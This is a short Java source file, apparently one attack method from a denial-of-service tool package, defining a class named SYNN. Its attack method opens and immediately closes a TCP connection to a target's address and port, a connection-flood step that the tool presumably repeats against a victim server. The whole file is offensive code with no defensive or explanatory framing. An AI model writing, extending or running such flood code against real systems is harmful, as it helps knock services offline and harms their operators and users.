package com.sytrus.api.methods;

import java.io.IOException;
import java.net.Socket;

import com.sytrus.api.Method;
import com.sytrus.api.Type;

public class SYNN extends Method {
	
	public SYNN() {
		this.type = Type.SYNN;
	}
	
	@Override
	public void attack(Socket socket) {
		try {
			new Socket(socket.getInetAddress(), socket.getPort()).close();
			System.out.print(".");
		} catch (IOException e) {
			log("Socket error in attack inside method class");
			return;
		}
	}

}
